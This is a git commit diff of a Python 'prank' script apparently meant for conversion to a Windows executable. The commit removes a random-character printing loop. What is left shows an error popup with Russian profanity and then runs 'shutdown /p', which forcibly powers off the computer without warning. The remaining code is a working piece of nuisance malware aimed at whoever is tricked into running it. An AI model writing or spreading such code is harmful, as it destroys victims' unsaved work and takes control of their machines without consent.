a5b703eee46936b7dfce636e26690b7311178baf
eroge-69 <erogexunamed@gmail.com>
2025-10-03 04:07:06 +0700

    Upload prank.py via PY to EXE tool

--- python-files/prank.py
+++ python-files/prank.py
@@ -5,14 +5,9 @@ import tkinter as tk
 from tkinter import messagebox
 import time
 
-def main():
-    for i in range(1,30000):
-        x = random.choice(["a", "s", "d", "f", "g", "h", "j", "k", "l", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"])
-        y = random.choice(["a", "s", "d", "f", "g", "h", "j", "k", "l", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"])
-        u = random.choice(["a", "s", "d", "f", "g", "h", "j", "k", "l", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"])
-        k = random.choice(["a", "s", "d", "f", "g", "h", "j", "k", "l", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"])
-        o = random.choice(["a", "s", "d", "f", "g", "h", "j", "k", "l", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"])
-        print(x ,y ,u ,k ,o ,y ,x ,o ,k ,u ,o , x ,o ,y ,k ,u ,k ,o ,y ,u ,k ,o ,y ,x ,o ,k ,u ,o , x ,o ,y ,k ,u ,k ,o ,y ,u ,k ,o ,y ,x ,o ,k ,u ,o , x ,o ,y ,k ,u ,k ,o ,y ,u ,k ,o ,y ,x ,o ,k ,u ,o , x )
+
+
+
 
 def shotdown():
     os.system("shutdown /p")
@@ -21,6 +16,6 @@ def erorr():
     messagebox.showerror("Erorr   ", "     suka blyat     ")
     time.sleep(0.2)
 
-main()
+
 erorr()
 shotdown()
